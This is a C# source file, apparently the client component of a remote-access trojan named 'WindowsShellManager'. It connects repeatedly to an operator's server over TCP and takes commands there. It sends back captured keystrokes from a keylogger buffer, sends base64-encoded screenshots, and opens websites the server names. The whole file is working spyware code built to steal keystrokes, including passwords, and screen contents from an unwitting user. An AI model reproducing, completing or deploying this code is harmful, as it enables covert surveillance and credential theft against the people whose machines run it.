using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Drawing;

namespace WindowsShellManager
{
    internal class Client
    {
        public void Connect(String server)
        {
            while (true)
            {
                try
                {
                    Int32 port = 40;
                    TcpClient client = new TcpClient(server, port);
                    NetworkStream stream = client.GetStream();

                    Byte[] connect = Encoding.ASCII.GetBytes("CONNECT");
                    SendData(stream, connect);

                    byte[] datalength = new byte[4];

                    int i;
                    while ((i = stream.Read(datalength, 0, 4)) != 0)
                    {
                        int dataLength = BitConverter.ToInt32(datalength, 0);
                        byte[] data = new byte[dataLength];

                        int bytesReceived = 0;
                        while (bytesReceived < data.Length)
                        {
                            bytesReceived += stream.Read(data, bytesReceived, data.Length - bytesReceived);
                        }

                        String decodedData = System.Text.Encoding.ASCII.GetString(data, 0, dataLength);

                        Console.WriteLine("Received: {0}", decodedData);
                        if (decodedData.ToUpper() == "SENDKCAPTURE")
                        {
                            Console.WriteLine("Sending Data...");

                            byte[] msg = Encoding.ASCII.GetBytes("DATA" + features.KeyLogger.KeyLog);
                            features.KeyLogger.KeyLog = String.Empty;
                            SendData(stream, msg);
                        }
                        else if (decodedData.ToUpper() == "SCREENSHOT")
                        {
                            Image bmp = new features.ScreenCapture().CaptureScreen();
                            string image = Helpers.helper.ImageToBase64(bmp);
                            byte[] msg = Encoding.ASCII.GetBytes("IMAGE" + image);
                            SendData(stream, msg);
                            bmp.Dispose();
                        }
                        else if (decodedData.ToUpper().StartsWith("OPENSITE"))
                        {
                            string[] command = decodedData.Split('|');
                            System.Diagnostics.Process.Start("http://" + command[1]);
                        }
                        else if (decodedData.ToUpper() == "DISCONNECT")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }
                    }
                }
                catch (ArgumentNullException e)
                {
                    Console.WriteLine("ArgumentNullException: {0}", e);
                }
                catch (SocketException e)
                {
                    Console.WriteLine("SocketException: {0}", e);
                }
                catch (FileNotFoundException e)
                {
                    Console.WriteLine("FileNotFoundException: {0}", e);
                }
                catch (System.IO.IOException e)
                {
                    Console.WriteLine("IOException: {0}", e);
                }
            }
        }
        void SendData(NetworkStream stream, byte[] data)
        {
            byte[] dataLength = BitConverter.GetBytes(data.Length);
            stream.Write(dataLength, 0, dataLength.Length);
            stream.Write(data, 0, data.Length);
        }
    }
}